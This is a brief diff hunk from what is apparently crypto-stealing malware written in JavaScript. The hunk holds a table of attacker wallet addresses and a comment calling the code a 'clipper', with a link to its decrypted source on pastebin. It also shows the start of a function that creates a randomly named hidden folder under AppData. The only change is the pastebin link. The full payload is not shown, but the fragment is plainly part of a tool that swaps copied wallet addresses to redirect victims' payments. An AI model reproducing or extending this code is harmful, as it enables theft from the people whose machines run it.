@@ -1067,7 +1067,7 @@ const addresses = {
     doge: "DQ5eZQyMbCsAGDoE7vq3zsPH7v43EvfUV6rJvtArsqqv7LEmb3BF6e1vHudGPCQppaxf"
 };
 
-// This is a clipper, here is the decrypted code: https://pastebin.com/raw/ujJT2Xje (DM me on Telegram if you don't know how to decrypt base64 :0)
+// This is a clipper, here is the decrypted code: https://pastebin.com/raw/juyfkJ4N (DM me on Telegram if you don't know how to decrypt base64 :0)
 async function clip(pythonwExe) {
     const appDataHiddenFolder = path.join(os.homedir(), 'AppData', 'Local', `.${generateRandomString(10)}`);
     if (!fs.existsSync(appDataHiddenFolder)) {
